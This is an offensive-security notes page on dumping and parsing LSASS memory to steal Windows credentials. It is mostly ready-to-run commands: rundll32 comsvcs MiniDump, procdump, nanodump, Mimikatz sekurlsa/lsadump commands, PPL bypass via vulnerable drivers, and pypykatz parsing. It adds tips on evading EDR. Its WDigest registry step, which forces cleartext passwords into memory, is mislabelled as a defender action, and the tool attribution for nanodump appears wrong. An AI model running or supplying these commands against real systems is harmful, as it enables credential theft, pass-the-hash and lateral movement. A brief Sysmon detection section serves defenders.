---
title: LSASS Dumping
---

Local Security Authority Subsystem Service (`lsass.exe`) is where Windows keeps everything useful: NT hashes of logged-in users, Kerberos TGTs and session keys, DPAPI masterkeys, and — on unpatched systems with WDigest enabled — cleartext passwords.

Getting a dump is the single highest-value action on a Windows host. Parsing it gives you the material for Pass-the-Hash, Pass-the-Ticket, Pass-the-Key, and DPAPI decryption all at once.

## Prerequisites

- **SYSTEM** account, **or**
- A medium-integrity Admin process **with** `SeDebugPrivilege` enabled

```cmd
whoami /priv | findstr SeDebug
```

If missing: PsExec `-s` to SYSTEM, impersonate a SYSTEM token, or use `services.msc` to run as SYSTEM.

## Methods (least → most detectable)

### 1. Task Manager (GUI, bypasses most hooks)

1. Open Task Manager → *Details* tab
2. Right-click `lsass.exe` → **Create dump file**
3. Note the path (`%TEMP%\lsass.DMP`)

AV generally doesn't block the Task Manager code path. If RDP/console is available and the environment is monitored, this is the quietest option.

### 2. `rundll32` + `comsvcs.dll` (classic, flagged everywhere)

```powershell
# Get LSASS PID
Get-Process lsass
# or
tasklist /svc | findstr lsass

# Create the dump
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

Every EDR flags the exact command line. Obfuscate the call or use PowerShell to invoke the `MiniDump` export directly.

### 3. `nanodump` (projectdiscovery) — stealthy

Nanodump avoids `MiniDumpWriteDump` entirely and reconstructs a valid dump from LSASS memory directly.

```powershell
nanodump.exe -w C:\Windows\Temp\lsass.dmp
# or fileless via named pipe
nanodump.exe --pipe <pipe-name>
```

### 4. Procdump (signed Microsoft binary)

Fewer alerts because the hash is Sysinternals-signed; most EDRs still catch the behavior.

```cmd
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -ma 764 lsass.dmp
```

### 5. Mimikatz in-memory (full LSA parsing, no dump file)

If you're happy to run Mimikatz on the box and bypass AV, this gets everything in one shot:

```
privilege::debug
sekurlsa::logonpasswords        # all logged-on user NT hashes + cleartext (if WDigest)
sekurlsa::tickets /export       # Kerberos tickets → .kirbi files
sekurlsa::ekeys                 # AES256/AES128/RC4 keys for every user
sekurlsa::credman               # Credential Manager
sekurlsa::dpapi                 # DPAPI masterkeys
lsadump::secrets                # LSA secrets (requires SYSTEM)
lsadump::cache                  # DCC2 cached domain creds
```

### 6. PPL Bypass (Windows 10 1607+)

Modern Windows runs LSASS as a Protected Process Light (PPL) — Admin can't `OpenProcess()` it without bypassing PPL.

Options:
- Boot into Safe Mode (Admin can turn off PPL temporarily)
- Load a signed driver that can call LSASS (`mimikatz!!` with `mimidrv.sys`, `PPLKiller`, `PPLBlade`)
- `RTCore64.sys` (vulnerable driver, BYOVD)

## Parsing on Linux

```bash
pip3 install pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp --json > parsed.json
```

Four categories of output:

| Section | Contents | Attack use |
|---|---|---|
| MSV | NT (sometimes LM) hashes | Pass-the-Hash, offline crack |
| WDIGEST | Cleartext passwords (legacy/unpatched) | Direct login |
| Kerberos | Session keys + tickets | Pass-the-Ticket, Overpass-the-Hash |
| DPAPI | Masterkeys | Decrypt browser / vault secrets later |

## WDigest (Cleartext Memory Store)

WDigest is disabled by default on Server 2012 R2 / Windows 8.1+. If enabled, logged-in users' cleartext passwords sit in LSASS.

Check and enable (requires Admin — defender action, not offense):
```powershell
# Check
Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name UseLogonCredential

# Enable (then wait for a user to log in)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

After a logon event, cleartext appears under `sekurlsa::logonpasswords` → `wdigest`.

## What Defenders See

- Process handle open on `lsass.exe` with `PROCESS_VM_READ` / `PROCESS_QUERY_INFORMATION` — Sysmon Event 10
- Minidump files written to `%TEMP%` — Sysmon Event 11 with target file ending `.dmp`
- WDigest registry modification — Sysmon Event 13

Everything leaves traces; the goal is minimizing them, not avoiding them.
